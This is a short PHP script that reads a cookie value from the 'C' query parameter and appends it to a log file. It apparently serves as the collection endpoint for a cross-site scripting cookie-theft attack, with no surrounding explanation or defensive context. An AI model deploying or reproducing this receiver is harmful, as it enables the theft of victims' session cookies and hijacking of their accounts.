<?php
    $cookie = $_GET['C']."\n";
    file_put_contents('../log/cookie.txt', $cookie, FILE_APPEND | LOCK_EX);
 ?>
